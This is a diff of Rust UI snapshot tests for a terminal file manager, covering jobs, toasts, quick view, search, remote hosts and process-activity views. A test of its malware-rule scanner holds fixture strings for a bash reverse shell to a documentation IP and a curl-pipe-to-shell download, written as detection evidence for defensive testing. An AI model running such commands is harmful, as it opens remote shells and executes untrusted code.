+    borg_core::update(&mut stage.state, Msg::Key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::ALT)), later);
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "Jobs · 2 running · 2 done")?;
+    ensure_text(&buffer, "Found 3 items")?;
+    ensure_text(&buffer, "41230 folders")?;
+    check("jobs_panel_folded", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('*')));
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "[ P Pause ]")?;
+    ensure_text(&buffer, "No space left on device")?;
+    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
+    let (column, row) = shot.find("[ P Pause ]").context("the selected job's buttons")?;
+    let click = crossterm::event::MouseEvent {
+        column: column + 2,
+        row,
+        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
+        modifiers: KeyModifiers::NONE,
+    };
+    let pressed = borg_ui::mouse_input(&stage.state, click, false, later);
+    assert!(matches!(pressed, Some(Msg::Key(KeyEvent { code: KeyCode::Char('p'), .. }))), "{pressed:?}");
+    check("jobs_panel_unfolded", &stage, buffer)
+}
+
+#[test]
+fn toasts_stack_in_the_corner_and_a_finished_one_offers_its_result() -> Result<()> {
+    let mut stage = stage_with(GridSize { cols: 120, rows: 30 }, Motion::STILL, NO_HIDDEN)?;
+    busy_jobs(&mut stage)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "✓ Found 3 items")?;
+    ensure_text(&buffer, "▶ Folder sizes")?;
+    ensure_no_text(&buffer, "Moving failed")?;
+    check("job_toasts", &stage, buffer)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(7))?;
+    ensure_text(&buffer, "✗ Moving failed: No space left")?;
+    ensure_no_text(&buffer, "Found 3 items")?;
+
+    let mut stage = stage_with_one_copy()?;
+    let shown = stage.started + Duration::from_secs(1);
+    let buffer = stage.render(shown)?;
+    ensure_text(&buffer, "Copied 1 file")?;
+    ensure_text(&buffer, "Alt-G Open · Alt-X Close")?;
+    ensure_closes_by_its_mark(&mut stage, &buffer, shown)?;
+    check("job_toast_finished", &stage, buffer)?;
+
+    let mut narrow = stage_with_one_copy_at(GridSize { cols: 50, rows: 20 })?;
+    let shown = narrow.started + Duration::from_secs(1);
+    let buffer = narrow.render(shown)?;
+    ensure_text(&buffer, "✓ Copied 1 file · Alt-G Open · Alt-X Close [×]")?;
+    ensure_closes_by_its_mark(&mut narrow, &buffer, shown)?;
+    check("job_toast_line", &narrow, buffer)
+}
+
+fn left_click(column: u16, row: u16) -> crossterm::event::MouseEvent {
+    crossterm::event::MouseEvent {
+        column,
+        row,
+        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
+        modifiers: KeyModifiers::NONE,
+    }
+}
+
+/// A click on the toast's close mark closes it, and a click beside the mark leaves it.
+fn ensure_closes_by_its_mark(stage: &mut Stage, buffer: &Buffer, now: Instant) -> Result<()> {
+    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
+    let (column, row) = shot.find("[×]").context("the toast's close mark")?;
+    let beside = borg_ui::toast_mouse(&stage.state, left_click(column - 1, row), now);
+    anyhow::ensure!(beside.is_none(), "a click beside the mark is left to what lies under it: {beside:?}");
+    let job = stage.state.toasts.first().context("the toast")?.job;
+    let closed = borg_ui::toast_mouse(&stage.state, left_click(column + 1, row), now);
+    let Some(close @ Msg::Pointer(borg_core::Pointer::CloseToast(closes))) = closed else {
+        anyhow::bail!("the mark closes its toast: {closed:?}")
+    };
+    anyhow::ensure!(closes == job, "the mark closes its own toast");
+    borg_core::update(&mut stage.state, close, now);
+    anyhow::ensure!(stage.state.toasts.is_empty(), "the toast is gone");
+    Ok(())
+}
+
+fn stage_with_one_copy() -> Result<Stage> {
+    stage_with_one_copy_at(GridSize { cols: 120, rows: 30 })
+}
+
+fn stage_with_one_copy_at(size: GridSize) -> Result<Stage> {
+    let mut stage = stage_with(size, Motion::STILL, NO_HIDDEN)?;
+    let id = running_copy(&mut stage)?;
+    let done = borg_jobs::Outcome::Done { done: borg_jobs::Totals { files: 1, bytes: 310 }, skipped: 0 };
+    stage.send(Msg::Job { id, event: borg_jobs::Event::Finished(done) });
+    Ok(stage)
 }
 
 fn peek(stage: &mut Stage, aside: borg_core::Aside, peek: borg_core::Peek) -> Result<()> {
@@ -925,6 +1528,84 @@ fn quick_view_shows_text_folders_and_pictures() -> Result<()> {
 }
 
 #[test]
+fn quick_view_shows_a_binary_as_hex_rows_and_h_shows_its_text() -> Result<()> {
+    let files = vec![
+        entry("bin", EntryKind::Dir, 4096, RECENT, false),
+        entry("image.bin", EntryKind::File, binary_sample().len() as u64, RECENT, false),
+        entry("notes.txt", EntryKind::File, 310, OLD, false),
+    ];
+    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, files, CLOCK)?;
+    hover(&mut stage, "image.bin");
+    stage.send(ctrl('q'));
+    let path = std::path::Path::new("image.bin");
+    let pager = borg_view::Pager::for_path(std::sync::Arc::new(binary_sample()), path, 43, 15)?;
+    peek(&mut stage, borg_core::Aside::QuickView, borg_core::Peek::Text(pager))?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "0000  42 4f 52 47 49 4d 47 00  BORGIMG.")?;
+    ensure_text(&buffer, "Tab focus · F7 find · h text")?;
+    check("quick_view_hex", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char('h'))).send(key(KeyCode::Tab));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Tab focus · F7 find · w wrap")?;
+    Ok(())
+}
+
+#[test]
+fn quick_view_marks_its_matches_and_says_when_there_are_none() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 110, rows: 22 }, Motion::STILL)?;
+    hover(&mut stage, "build.sh");
+    stage.send(ctrl('q'));
+    let script = [
+        "#!/bin/sh",
+        "set -eu",
+        "",
+        "echo \"building borg\"",
+        "cargo fmt --all --check",
+        "cargo clippy --workspace -- -D warnings",
+        "cargo test --workspace",
+        "cargo build --release",
+        "",
+        "mkdir -p dist",
+        "cp target/release/borg dist/",
+        "tar -czf dist/borg.tar.gz -C dist borg",
+        "echo \"done\"",
+    ];
+    let path = std::path::Path::new("build.sh");
+    let pager = borg_view::Pager::for_path(std::sync::Arc::new(script.join("\n").into_bytes()), path, 43, 15)?;
+    peek(&mut stage, borg_core::Aside::QuickView, borg_core::Peek::Text(pager))?;
+    stage.send(key(KeyCode::Tab)).send(key(KeyCode::F(7)));
+    for msg in chars("cargo") {
+        send_and_search(&mut stage, msg);
+    }
+    send_and_search(&mut stage, key(KeyCode::Enter));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2 of 4")?;
+    ensure_text(&buffer, "Focused · Tab back · 100% · F7 find · w wrap")?;
+    ensure_no_text(&buffer, "Tab focus")?;
+    check("quick_view_find", &stage, buffer)?;
+
+    for msg in chars(" bench") {
+        send_and_search(&mut stage, msg);
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "No matches")?;
+    check("quick_view_find_no_match", &stage, buffer)?;
+
+    for _ in " bench".chars() {
+        send_and_search(&mut stage, key(KeyCode::Backspace));
+    }
+    send_and_search(&mut stage, key(KeyCode::Esc));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Focused · Tab back · 100% · 1 of 4 ")?;
+    ensure_no_text(&buffer, "Tab focus")?;
+    stage.send(key(KeyCode::Tab));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "100% · Tab focus · 1 of 4 · n next · N previous")?;
+    Ok(())
+}
+
+#[test]
 fn info_panel_lists_file_facts() -> Result<()> {
     let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
     hover(&mut stage, "build.sh");
@@ -943,12 +1624,26 @@ fn info_panel_lists_file_facts() -> Result<()> {
         items: None,
         disk: Some((128_849_018_880, 499_963_174_912)),
         backup: None,
+        drive: Some(borg_drives::Facts {
+            drive: borg_drives::Drive {
+                id: "disk1".into(),
+                kind: borg_drives::DriveKind::SolidState,
+                filesystem: "apfs".into(),
+                clones: true,
+            },
+            rates: borg_drives::Rates { read: 2_400 * MIB, write: 1_800 * MIB },
+            measured: true,
+            asks: false,
+        }),
     };
     peek(&mut stage, borg_core::Aside::Info, borg_core::Peek::Info(facts))?;
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "rwxr-xr-x 0755")?;
     ensure_text(&buffer, "me:staff")?;
     ensure_text(&buffer, "120G of 466G")?;
+    ensure_text(&buffer, "SSD · apfs · measured speed")?;
+    ensure_text(&buffer, "reads 2.3G/s, writes 1.8G/s")?;
+    ensure_text(&buffer, "Borg starts them at once")?;
     check("info_panel", &stage, buffer)
 }
 
@@ -1173,8 +1868,12 @@ fn dialogs_take_clicks_on_rows_and_key_hints_and_close_when_clicked_beside() -> 
     // Remote hosts: the tabs, the rows and the keys in the border take clicks.
     stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
     stage.send(Msg::RemoteCatalog { choices: Vec::new(), complete: true });
-    let client =
-        |name: &str| borg_core::RemoteClient { name: name.into(), fingerprint: "aa:bb".into(), connections: None };
+    let client = |name: &str| borg_core::RemoteClient {
+        name: name.into(),
+        fingerprint: "aa:bb".into(),
+        connections: None,
+        key_changed: None,
+    };
     stage.send(Msg::RemoteClients(vec![client("dev@laptop"), client("workstation")]));
     assert!(matches!(stage.state.overlay, Some(Overlay::Remotes(ref browser)) if browser.show_clients));
     let row = tap(&mut stage, "workstation")?.unwrap();
@@ -1314,7 +2013,7 @@ fn virtual_collection_expanded_and_grouped() -> Result<()> {
     stage.state.panels[0].group_results(borg_core::ResultGroup::Folder);
     let buffer = stage.render(stage.started)?;
     check("collection_grouped", &stage, buffer)?;
-    stage.state.panels[0].filter_results("/web/".into());
+    stage.state.panels[0].filter_results("/web/".into(), false);
     let buffer = stage.render(stage.started)?;
     check("collection_filtered_hidden_marks", &stage, buffer)
 }
@@ -1337,20 +2036,21 @@ fn recursive_search_partial_and_cancelled() -> Result<()> {
     stage.state.panels[0].open_results(
         borg_core::ResultSource::Search {
             request: borg_core::SearchRequest {
+                typos: false,
                 skip: None,
                 root: "/workspace".into(),
                 query: "*.toml".into(),
                 hidden: false,
                 options: Default::default(),
             },
-            progress: borg_core::SearchProgress {
+            progress: Box::new(borg_core::SearchProgress {
                 visited: 1234,
                 errors: 2,
                 skipped: 4,
                 limited: false,
                 cancelled: false,
                 ..Default::default()
-            },
+            }),
         },
         entries,
         51,
@@ -1378,6 +2078,7 @@ fn contents_results(stage: &mut Stage) -> Result<String> {
     let offset = source.find("TODO").context("the match")? as u64;
     let contents = borg_view::Query { text: "todo".into(), words: true, ..Default::default() };
     let request = borg_core::SearchRequest {
+        typos: false,
         skip: None,
         root: "/workspace".into(),
         query: "*".into(),
@@ -1391,11 +2092,7 @@ fn contents_results(stage: &mut Stage) -> Result<String> {
         (file, line)
     };
     stage.state.result_history[0] = Some(stage.state.panels[0].clone());
-    stage.state.panels[0].open_results(
-        ResultSource::Search { request, progress: SearchProgress::default() },
-        Vec::new(),
-        60,
-    );
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 60);
     stage.state.panels[0].begin_search(60);
     let found = vec![
         found("/workspace/api/src/handlers.rs", 2_048, 42, "    // ", "TODO", ": retry on timeout"),
@@ -1407,6 +2104,23 @@ fn contents_results(stage: &mut Stage) -> Result<String> {
     stage.send(Msg::SearchProgress { side: Side::Left, generation: 60, progress });
     stage.send(Msg::Listed { side: Side::Left, generation: 60, error: None });
     Ok(source)
+}
+
+#[test]
+fn ctrl_r_in_contents_results_asks_what_replaces_the_text() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
+    contents_results(&mut stage)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::CONTROL)));
+    for msg in chars("fixme") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Replace \"todo\" in 3 files with:")?;
+    check("search_contents_replace", &stage, buffer)?;
+    stage.send(Msg::Key(KeyEvent::from(KeyCode::Enter)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Replace every match of \"todo\"")?;
+    check("search_contents_replace_confirm", &stage, buffer)
 }
 
 #[test]
@@ -1459,6 +2173,144 @@ fn contents_search_dialog_results_and_landings_in_the_viewer_and_editor() -> Res
     ensure_text(&buffer, "1 of 2")?;
     ensure_text(&buffer, "let todo = queue.pop();")?;
     check("search_contents_editor", &stage, buffer)
+}
+
+#[test]
+fn rules_search_dialog_and_results_name_the_rules_each_file_matched() -> Result<()> {
+    use borg_core::{Action, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};
+    use borg_rules::{Evidence, Level, Problem, RuleMatch};
+
+    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
+    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
+    for _ in 0..3 {
+        stage.send(key(KeyCode::Tab));
+    }
+    stage.send(key(KeyCode::Left));
+    stage.send(key(KeyCode::Left));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Rule matches")?;
+    anyhow::ensure!(!Snapshot::from_buffer(buffer.clone(), &stage.palette, None).contains("Containing"));
+    check("search_rules_dialog", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+
+    let request = borg_core::SearchRequest {
+        typos: false,
+        skip: None,
+        root: "/home/me/Downloads".into(),
+        query: "*".into(),
+        hidden: false,
+        options: SearchOptions { kind: SearchKind::Rules, ..Default::default() },
+    };
+    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 61);
+    stage.state.panels[0].begin_search(61);
+    let hit = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
+        rule: rule.into(),
+        namespace: namespace.into(),
+        level,
+        description: None,
+        false_positives: None,
+        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
+    };
+    let found = |path: &str, size: u64, hits: Vec<RuleMatch>| {
+        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
+        file.source = Some(path.into());
+        (file, hits)
+    };
+    let user = "/home/me/.config/borg-commander/rules/stealers.yar";
+    let found = vec![
+        found(
+            "/home/me/Downloads/setup.sh",
+            4_812,
+            vec![
+                hit("reverse_shell", borg_rules::BUILT_IN, Level::Alert, 912, b"bash -i >& /dev/tcp/203.0.113.7/4444"),
+                hit(
+                    "download_and_run",
+                    borg_rules::BUILT_IN,
+                    Level::Notice,
+                    120,
+                    b"curl -fsSL https://example.net/i | sh",
+                ),
+            ],
+        ),
+        found(
+            "/home/me/Downloads/tool",
+            2_310_144,
+            vec![hit("upx_packed", borg_rules::BUILT_IN, Level::Notice, 236, b"UPX!")],
+        ),
+        found(
+            "/home/me/Downloads/Invoice.app.zip",
+            88_412,
+            vec![hit("MacStealer_Prompt", user, Level::Warning, 4_096, b"\x00\x01display dialog")],
+        ),
+    ];
+    stage.send(Msg::RuleHits { side: Side::Left, generation: 61, found });
+    let left_out =
+        vec![Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() }];
+    let progress = SearchProgress { visited: 240, read: 230, unread: 2, rules: 16, left_out, ..Default::default() };
+    stage.send(Msg::SearchProgress { side: Side::Left, generation: 61, progress });
+    stage.send(Msg::Listed { side: Side::Left, generation: 61, error: None });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "230 files scanned with 16 rules")?;
+    ensure_text(&buffer, "reverse_shell +1")?;
+    check("search_rules_results", &stage, buffer)?;
+    stage.state.panels[0].results.as_mut().context("results")?.expanded = true;
+    stage.send(Msg::Resize { cols: 110, rows: 30 });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "rule files left out: 1")?;
+    ensure_text(&buffer, "MacStealer_Prompt 00 01 64 69")?;
+    check("search_rules_results_expanded", &stage, buffer)
+}
+
+#[test]
+fn packed_executables_show_how_much_of_their_code_has_high_entropy() -> Result<()> {
+    use borg_core::{Action, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};
+    use borg_view::entropy::{BLOCK, Entropy, Tally};
+
+    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
+    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
+    for _ in 0..3 {
+        stage.send(key(KeyCode::Tab));
+    }
+    stage.send(key(KeyCode::Left));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Packed executables")?;
+    anyhow::ensure!(!Snapshot::from_buffer(buffer.clone(), &stage.palette, None).contains("Containing"));
+    check("search_packed_dialog", &stage, buffer)?;
+    stage.send(key(KeyCode::Esc));
+
+    let request = borg_core::SearchRequest {
+        typos: false,
+        skip: None,
+        root: "/home/me/Downloads".into(),
+        query: "*".into(),
+        hidden: false,
+        options: SearchOptions { kind: SearchKind::Packed, ..Default::default() },
+    };
+    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 62);
+    stage.state.panels[0].begin_search(62);
+    let high = Entropy::of(&(0..=255u8).cycle().take(BLOCK as usize).collect::<Vec<_>>());
+    let code = Entropy::of(&[0x48, 0x89, 0xe5, 0xc3, 0x55, 0x8b].repeat(700));
+    let found = |path: &str, size: u64, blocks: u64, high_blocks: u64| {
+        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
+        file.source = Some(path.into());
+        let mut tally = Tally::default();
+        (0..blocks).for_each(|block| tally.add(block * BLOCK, if block < blocks - high_blocks { code } else { high }));
+        (file, tally)
+    };
+    let found = vec![
+        found("/home/me/Downloads/tool", 2_310_144, 560, 548),
+        found("/home/me/Downloads/updater/helper", 812_032, 196, 141),
+    ];
+    stage.send(Msg::PackedHits { side: Side::Left, generation: 62, found });
+    let progress = SearchProgress { visited: 240, read: 37, unread: 201, ..Default::default() };
+    stage.send(Msg::SearchProgress { side: Side::Left, generation: 62, progress });
+    stage.send(Msg::Listed { side: Side::Left, generation: 62, error: None });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "37 programs read · 201 other files")?;
+    ensure_text(&buffer, "97% high · max 8")?;
+    check("search_packed_results", &stage, buffer)
 }
 
 #[test]
@@ -1588,13 +2440,19 @@ fn discovery_windows_and_folder_totals() -> Result<()> {
     stage.state.panels[0].open_results(
         ResultSource::Search {
             request: SearchRequest {
+                typos: false,
                 skip: None,
                 root: "/workspace".into(),
                 query: "*".into(),
                 hidden: true,
                 options: SearchOptions { kind: SearchKind::FolderTotals, ..Default::default() },
             },
-            progress: SearchProgress { measured: at(RECENT), visited: 99_104, errors: 1, ..Default::default() },
+            progress: Box::new(SearchProgress {
+                measured: at(RECENT),
+                visited: 99_104,
+                errors: 1,
+                ..Default::default()
+            }),
         },
         vec![cache, build, partial],
         80,
@@ -1636,6 +2494,36 @@ fn remote_session_removal_confirmation_and_progress() -> Result<()> {
 }
 
 #[test]
+fn remote_host_update_confirmation_and_progress() -> Result<()> {
+    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
+    stage.send(Msg::RemoteCatalog {
+        choices: vec![borg_core::RemoteChoice {
+            machine: "production".into(),
+            session: Some("default".into()),
+            name: "Default".into(),
+            info: borg_core::RemoteHostInfo {
+                version: Some("0.10.0".into()),
+                platform: Some("linux / x86_64".into()),
+                service: Some(true),
+                latency_ms: Some(38),
+                relay: "wss://relay.example".into(),
+            },
+            ..Default::default()
+        }],
+        complete: true,
+    });
+    let buffer = stage.render(stage.started)?;
+    check("remote_host_shortcuts", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('u')));
+    let buffer = stage.render(stage.started)?;
+    check("remote_host_update_confirm", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('y')));
+    let buffer = stage.render(stage.started)?;
+    check("remote_host_updating", &stage, buffer)
+}
+
+#[test]
 fn remote_colony_lists_incoming_clients_and_their_connection_status() -> Result<()> {
     let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
     stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
@@ -1643,18 +2531,21 @@ fn remote_colony_lists_incoming_clients_and_their_connection_status() -> Result<
     stage.send(Msg::RemoteClients(vec![
         borg_core::RemoteClient {
             name: "dev@laptop".into(),
-            fingerprint: "aabb:ccdd:eeff".into(),
+            fingerprint: "aabb-ccdd-eeff-0011".into(),
             connections: Some(3),
+            key_changed: Some(borg_core::KeyChange { when: "2026-11-09".into(), was: "0102-0304-0506-0708".into() }),
         },
         borg_core::RemoteClient {
             name: "workstation".into(),
             fingerprint: "1122:3344:5566".into(),
             connections: Some(0),
+            key_changed: None,
         },
         borg_core::RemoteClient {
             name: "old-host-status".into(),
             fingerprint: "7788:99aa:bbcc".into(),
             connections: None,
+            key_changed: None,
         },
     ]));
     let buffer = stage.render(stage.started)?;
@@ -1985,13 +2876,19 @@ fn size_tree_stage() -> Result<Stage> {
     stage.state.panels[0].open_results(
         ResultSource::Search {
             request: SearchRequest {
+                typos: false,
                 skip: None,
                 root: "/workspace/project".into(),
                 query: "*".into(),
                 hidden: true,
                 options: SearchOptions { kind: SearchKind::FolderTree, ..Default::default() },
             },
-            progress: SearchProgress { measured: at(RECENT), visited: 84_422, errors: 1, ..Default::default() },
+            progress: Box::new(SearchProgress {
+                measured: at(RECENT),
+                visited: 84_422,
+                errors: 1,
+                ..Default::default()
+            }),
         },
         entries,
         80,
@@ -2012,10 +2909,10 @@ fn size_tree_fresh_cached_filtered_and_narrow() -> Result<()> {
     stage.send(key(KeyCode::Insert)).send(key(KeyCode::Left)).send(key(KeyCode::Left));
     let buffer = stage.render(stage.started)?;
     check("size_tree_cached", &stage, buffer)?;
-    stage.state.panels[0].filter_results("deps".into());
+    stage.state.panels[0].filter_results("deps".into(), false);
     let buffer = stage.render(stage.started)?;
     check("size_tree_filtered", &stage, buffer)?;
-    stage.state.panels[0].filter_results(String::new());
+    stage.state.panels[0].filter_results(String::new(), false);
     stage.send(Msg::Resize { cols: 44, rows: 12 });
     let buffer = stage.render(stage.started)?;
     check("size_tree_narrow", &stage, buffer)?;
@@ -2066,7 +2963,7 @@ fn size_tree_loading_and_cached_folder_listing() -> Result<()> {
         unreachable!()
     };
     stage.state.panels[0].open_results(
-        ResultSource::Search { request, progress: SearchProgress { visited: 100, ..Default::default() } },
+        ResultSource::Search { request, progress: Box::new(SearchProgress { visited: 100, ..Default::default() }) },
         vec![root],
         81,
     );
@@ -2091,9 +2988,22 @@ fn size_tree_loading_and_cached_folder_listing() -> Result<()> {
     check("folder_sizes_cached_listing", &stage, buffer)
 }
 
+/// How long the made-up system of the activity snapshots has been up.
+const UPTIME: Duration = Duration::from_secs(3 * 86_400 + 4 * 3_600 + 12 * 60 + 9);
+
 fn activity_stage() -> Result<Stage> {
-    use borg_core::{ActivityData, ActivityRequest, ProcessInfo, ProcessKey, SystemSample};
-    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    activity_stage_with(GridSize { cols: 132, rows: 34 }, |sample| sample)
+}
+
+/// The activity monitor at `size`, with each made-up sample passed through `system` first.
+fn activity_stage_with(
+    size: GridSize,
+    system: impl Fn(borg_core::SystemSample) -> borg_core::SystemSample,
+) -> Result<Stage> {
+    use borg_core::{
+        ActivityData, ActivityRequest, DiskActivity, LoadAverage, ProcessInfo, ProcessKey, SystemSample, Threads,
+    };
+    let mut stage = stage(size, Motion::STILL)?;
     let theme = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap();
     stage.state.appearance.select(theme, stage.started, Duration::ZERO);
     stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('m'), KeyModifiers::ALT)));
@@ -2125,7 +3035,7 @@ fn activity_stage() -> Result<Stage> {
             .collect();
         stage.send(Msg::Activity {
             id,
-            result: Ok(ActivityData::Sample(SystemSample {
+            result: Ok(ActivityData::Sample(system(SystemSample {
                 processes,
                 total: 32_000_000_000,
                 used: 18_000_000_000,
@@ -2134,7 +3044,11 @@ fn activity_stage() -> Result<Stage> {
                 cpu: vec![7500, 4400, 2100, 1200],
                 administrator: false,
                 own: Some(413),
-            })),
+                disk: Some(DiskActivity { read: 12_400_000, written: 3_100_000, busy: Some(1_400) }),
+                load: Some(LoadAverage { one: 214, five: 187, fifteen: 120 }),
+                uptime: Some(UPTIME),
+                threads: Some(Threads { total: 412, running: 3 }),
+            }))),
         });
         if tick < 9 {
             let next = stage.state.activity.pending.as_ref().map(|p| p.0).unwrap_or(id + 1);
@@ -2142,6 +3056,20 @@ fn activity_stage() -> Result<Stage> {
         }
     }
     Ok(stage)
+}
+
+#[test]
+fn activity_hides_idle_processes_and_says_how_many() -> Result<()> {
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Char('c'))).send(key(KeyCode::Char('h')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "1 idle hidden")?;
+    ensure_text(&buffer, "H Show idle")?;
+    check("activity_idle_hidden", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('/'))).send(key(KeyCode::Char('s'))).send(key(KeyCode::Enter));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2 of 5")?;
+    check("activity_idle_hidden_filtered", &stage, buffer)
 }
 
 #[test]
@@ -2159,6 +3087,83 @@ fn activity_signal_dialog_lists_signals_and_priority_steps() -> Result<()> {
         stage.state.activity.pending,
         Some((_, ActivityRequest::Control { control: ProcessControl::Signal(ProcessSignal::Kill), admin: false, .. }))
     ));
+    Ok(())
+}
+
+#[test]
+fn entropy_scan_ranks_packed_code_first_and_details_the_selected_hit() -> Result<()> {
+    use borg_core::{EntropyHit, EntropyReport, HitKind, MemoryRegion, ProcessKey};
+    use borg_view::entropy::{Entropy, Tally};
+    let mut stage = activity_stage()?;
+    stage.send(key(KeyCode::Char('e')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "All memory of all processes")?;
+    check("entropy_scan_dialog", &stage, buffer)?;
+    stage.send(key(KeyCode::Char('c')));
+    let id = stage.state.activity.entropy.as_ref().unwrap().id;
+
+    let dense = Entropy::of(&(0..=255u8).cycle().take(4096).collect::<Vec<_>>());
+    let hit = |pid: u32, name: &str, region: MemoryRegion, high: u32, highest: Entropy| EntropyHit {
+        process: ProcessKey { pid, start: 100 },
+        name: name.into(),
+        kind: HitKind::of(&region),
+        tally: Tally { blocks: 40, high, highest, first_high: Some(region.start + 0x3000) },
+        region,
+    };
+    let region = |start: u64, size: u64, permissions: &str, name: &str, path: Option<&str>| MemoryRegion {
+        start,
+        end: start + size,
+        permissions: permissions.into(),
+        name: path.map_or_else(|| name.into(), |path| format!("{name} · {path}")),
+        path: path.map(String::from),
+        dirty: Some(if permissions.contains('w') { 4096 } else { 0 }),
+        ..Default::default()
+    };
+    let hits = vec![
+        hit(412, "database", region(0x7f10_0000, 0x10_0000, "rw-", "MALLOC_LARGE", None), 31, dense),
+        hit(
+            411,
+            "language-server",
+            region(0x1_0000_0000, 0x80_0000, "r-x", "__TEXT", Some("/usr/local/bin/language-server")),
+            3,
+            Entropy::HIGH,
+        ),
+        hit(
+            410,
+            "compiler",
+            region(0x1_2000_0000, 0x40_0000, "r-x", "__TEXT", Some("/usr/local/bin/compiler")),
+            38,
+            dense,
+        ),
+        hit(
+            410,
+            "compiler",
+            region(0x2_0000_0000, 0x20_0000, "r--", "mapped file", Some("/usr/local/share/compiler/fonts.pak")),
+            40,
+            dense,
+        ),
+    ];
+    let first = EntropyReport { hits, scanned: 3, ..Default::default() };
+    stage.send(Msg::EntropyScan { id, found: Ok(first), done: false });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "scanning · Ctrl-C stop · 3 of 5 processes · 4 hits")?;
+    ensure_text(&buffer, "Most of this code is as dense")?;
+    check("entropy_scan_running", &stage, buffer)?;
+
+    let shell = ProcessKey { pid: 414, start: 100 };
+    let last = EntropyReport {
+        scanned: 0,
+        unreadable: vec![shell],
+        remaining: vec![ProcessKey { pid: 413, start: 100 }],
+        ..Default::default()
+    };
+    stage.send(Msg::EntropyScan { id, found: Ok(last), done: true });
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "1 unreadable · 0 protected · 1 not reached")?;
+    ensure_text(&buffer, "N Continue")?;
+    ensure_text(&buffer, "A Administrator")?;
+    check("entropy_scan_results", &stage, buffer)?;
     Ok(())
 }
 
@@ -2187,7 +3192,7 @@ fn activity_process_memory_map_snapshots_and_permissions() -> Result<()> {
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "/ edit")?;
     check("activity_filter_applied", &stage, buffer)?;
-    stage.send(key(KeyCode::Esc));
+    stage.send(key(KeyCode::Char('/'))).send(key(KeyCode::Esc));
     stage.send(key(KeyCode::Tab));
     let buffer = stage.render(stage.started)?;
     check("activity_memory", &stage, buffer)?;
@@ -2339,9 +3344,15 @@ fn memory_macos_protects_is_marked_explained_and_offers_no_administrator() -> Re
     Ok(())
 }
 
+/// Bytes as varied as `bits` bits each, near enough: `2^bits` values taken in turn.
+fn entropy_of(bits: u32) -> Option<borg_view::entropy::Entropy> {
